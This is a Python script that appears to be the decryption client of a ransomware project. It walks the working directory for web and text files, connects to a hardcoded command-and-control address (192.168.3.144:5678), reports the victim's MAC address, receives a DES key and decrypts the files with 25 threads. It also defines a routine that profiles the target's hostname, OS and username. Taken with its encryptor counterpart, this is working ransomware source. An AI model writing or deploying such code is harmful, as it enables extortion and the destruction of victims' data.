#import modules
import os
import socket
import uuid
import json


import platform
import random
from threading import Thread
from queue import Queue

# enc
from pyDes import des, CBC, PAD_PKCS5
import binascii



def find_files_path():
    extensions_to_encrpt = ('.css','.html',".js",".json",".php",".txt");

    # grab all files
    selected_files_path = []
    for root, dirs,files in os.walk("./"):
        for file in files:
            if file.endswith(extensions_to_encrpt):
                selected_files_path.append (os.path.join(root, file))


    return selected_files_path;
        


def get_target_system_information():
    
    target_information = {
        "target_hostname" : socket.gethostname(),
        "target_machine_arch" : platform.machine(),
        "target_os_version": platform.version(),
        "target_platform" : platform.platform(),
        "target_user_info" : platform.uname(),
        "target_username": os.getenv("USERNAME"),
        "target_system" : platform.system(),
        "target_processor" : platform.processor(),
        }
    
    return target_information
    
    
def des_decrypt(s,key):
    secret_key = key;
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    de = k.decrypt(binascii.a2b_hex(s), padmode=PAD_PKCS5)
    return de.decode()

def custom_decrypt_files(encryption_key,q):
    while q.not_empty:
        file = q.get();
        try:
            with open(file,'rb') as f:
                data = f.read();
                
            if data:
                with open(file,'w') as f:
                    data = des_decrypt(data,encryption_key)
                    f.write(data)
        except:
            pass;
        
        q.task_done();
     
def prepare_decrypt_file(paths_to_file,encryption_key):
    q = Queue()
    for file in paths_to_file:
        q.put(file);
    
    for i in range(25):
        thread = Thread(target=custom_decrypt_files, daemon= True,args=(encryption_key,q,));
        thread.start();
    
    q.join();
    
    return 1;


    

# define constants
SERVER_IP = "192.168.3.144";
SERVER_PORT = 5678;


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    
        # connect with server
        s.connect((SERVER_IP,SERVER_PORT));
        
        s.send("1".encode('utf-8'))
        
        system_information = get_target_system_information()
        
        target_information = {
            "target_mac" : hex(uuid.getnode()),
        }
        
        # print(target_mac);
        s.send(json.dumps(target_information,indent=2).encode('utf-8'));
        
        # get encryption key
        encryption_key = s.recv(1024).decode('utf-8');
        
        if(encryption_key):
            paths_to_file = find_files_path();
            prepare_decrypt_file(paths_to_file, encryption_key);

main()
